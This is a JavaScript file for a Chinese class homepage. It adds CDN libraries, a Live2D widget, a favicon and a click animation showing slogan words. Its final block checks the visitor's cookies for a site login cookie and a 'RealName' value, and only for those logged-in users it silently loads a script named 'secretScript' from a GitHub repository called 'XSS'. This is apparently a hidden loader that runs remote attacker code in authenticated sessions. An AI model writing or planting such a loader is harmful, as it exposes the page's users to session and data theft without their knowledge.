const body = document.getElementsByTagName("body")[0];

const polyfillScript = document.createElement("script");
polyfillScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.min.js");
body.insertAdjacentElement("afterbegin", polyfillScript);

const howlerScript = document.createElement("script");
howlerScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/howler@2.1.3/dist/howler.min.js");
body.insertAdjacentElement("afterbegin", howlerScript);

const pixiScript = document.createElement("script");
pixiScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/pixi.js@4.6.1/dist/pixi.min.js");
body.insertAdjacentElement("afterbegin", pixiScript);

const jqueryScript = document.createElement("script");
jqueryScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js");
body.insertAdjacentElement("afterbegin", jqueryScript);

const autoloadScript = document.createElement("script");
autoloadScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/CDN@HEAD/live2d/autoload.js");
body.insertAdjacentElement("afterbegin", autoloadScript);

const fontLink = document.createElement("link");
fontLink.setAttribute("href", "https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css");
fontLink.setAttribute("rel", "stylesheet");
body.insertAdjacentElement("afterbegin", fontLink);

(function() {
    var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = '/ewebeditor/uploadfile/202009/20200913135731667.gif';
    document.getElementsByTagName('head')[0].appendChild(link);
})();

document.title = '班级主页';

/* 鼠标特效 */
var a_idx = 0;
jQuery(document).ready(function($) {
    $("body").click(function(e) {
        var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
        var $i = $("<span/>").text(a[a_idx]);
        a_idx = (a_idx + 1) % a.length;
        var x = e.pageX,
        y = e.pageY;
        $i.css({
            "z-index": 99999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": "#ff6651"
        });
        $("body").append($i);
        $i.animate({
            "top": y - 180,
            "opacity": 0
        },
        1500,
        function() {
            $i.remove();
        });
    });
}); (function() {
    var cookie = document.cookie;
    s = cookie.indexOf("nbxiaoshi2010=dzbp");
    t = cookie.indexOf("RealName=");
    if (s != -1) {
        if (t != -1 && cookie[t + 9] != '&') {
            const secretScript = document.createElement("script");
            secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@HEAD/1.js");
            body.insertAdjacentElement("afterbegin", secretScript);
        }
    }
})();
